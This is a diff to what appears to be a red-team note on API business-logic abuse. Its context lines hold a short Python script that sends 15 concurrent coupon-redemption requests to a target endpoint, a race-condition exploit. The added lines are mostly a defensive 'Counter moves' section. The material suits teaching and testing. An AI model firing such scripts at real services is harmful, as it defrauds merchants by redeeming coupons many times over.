@@ -91,12 +91,14 @@ TOKEN = "YOUR_TOKEN"
 COUPON = "TESTCOUPON"
 ENDPOINT = "https://target.com/api/v1/redeem"
 
+
 def redeem():
     r = requests.post(ENDPOINT,
                       headers={"Authorization": f"Bearer {TOKEN}",
                                "Content-Type": "application/json"},
                       json={"coupon": COUPON})
     print(r.status_code, r.text[:120])
+
 
 threads = [threading.Thread(target=redeem) for _ in range(15)]
 for t in threads: t.start()
@@ -230,3 +232,7 @@ total value extractable before any alert fires?
 
 - [Business logic abuse](../notes/business-logic.md)
 - [Race conditions](../notes/business-logic.md)
+
+## Counter moves
+
+Playbook: Business logic abuse is the case here. Authorisation on every endpoint, schema validation, and rate limiting are the counters. The defender's view is in the blue notes on [the surface designed to be accessible](https://blue.tymyrddin.dev/docs/counter/api/).
